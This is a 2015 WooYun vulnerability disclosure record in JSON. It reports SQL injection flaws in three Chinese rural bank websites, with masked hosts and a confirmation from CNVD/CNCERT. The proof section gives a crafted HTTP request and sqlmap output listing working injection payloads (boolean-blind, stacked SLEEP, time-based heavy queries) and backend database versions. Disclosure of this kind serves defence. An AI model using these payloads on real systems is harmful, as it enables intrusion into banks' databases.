{"id": 71424, "wybug_id": "wooyun-2015-0145544", "wybug_title": "三个农商行一些漏洞打包", "wybug_corp": "农商行", "wybug_author": "路人甲", "wybug_date": "2015-10-09 18:14", "wybug_open_date": "2015-11-27 18:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入打包"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向公众公开  简要描述： 人生有太多的意外事情，我的心好难受..可是必须残酷面对。 详细说明：  详细说明见漏洞证明。   漏洞证明：  只证明漏洞存在，拖库我不擅长也不是我的爱好。（1）湖商村镇银行（http://**.**.**.**）POST型SQL注入，构造如下POST数据，sid参数存在注入\nPOST /search.jsp HTTP/1.1Content-Length: 58Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://**.**.**.**/Cookie: JSESSIONID=rBABAR-QVg08ecQlwZnLc0cnskwx-cWpSDAAHost: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*Page=0&sid=502&topic=1\n测试结果：\nsqlmap identified the following injection points with a total of 262 HTTP(s) requests:---Place: POSTParameter: sid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Page=0&sid=502 AND 5798=5798&topic=1---web server operating system: Windows 2003 or 7web application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: Microsoft SQL Server 2008\n（2）黑河农商行（http://**.**.**.**）注入点：http://**.**.**.**/Web_XXXX.aspx?InfoID=1，翻到这个页面直接报错，于是顺手测试下。\nsqlmap identified the following injection points with a total of 116 HTTP(s) requests:---Place: GETParameter: InfoID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: InfoID=1' AND 1269=1269 AND 'MIcX'='MIcX    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: InfoID=1'; SELECT SLEEP(5)-- ---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 1.1.4322back-end DBMS: MySQL 5.0.11\n（3）泉州农商行（**.**.**.**）注入点：**.**.**.**/business.aspx?cid=-1 ，参数后面加个'报错了\n\n来吧继续给个测试结果\nsqlmap identified the following injection points with a total of 112 HTTP(s) requests:---Place: GETParameter: cid    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)    Payload: cid=(SELECT (CASE WHEN (3262=3262) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 3262 END))---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\nOK，说完了。   修复方案：  银行系统没理由不重视。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-10-13 17:58 厂商回复：     CNVD确认并复现所述情况,已经转由CNCERT向银行业信息化主管部门通报,由其后续协调网站管理单位处置. 同步发给对应多个分中心.rank 14 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-09 18:19 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:20        | You have an error in your SQL syntax; ch...)\t\t \n  人生有太多的意外事情，我的心好难受..可是必须残酷面对。    \n     2015-10-09 18:56 |    \t\t撸管 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:6        | 别人笑我太猥琐,我笑着朝她猛颜射)\t\t \n  @Drizzle.Risk 看着你漏洞19 rank255 看着我漏洞5 rank4  我想撞墙-.-    \n     2015-10-09 21:17 |    \t\tMagi \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 金鳞岂是池中物,一遇风云便化龙.)\t\t \n  mee too    \n     2015-11-27 18:02 |    \t\t风行者 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 程序员屌丝一枚)\t\t \n  @撸管 我也是。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}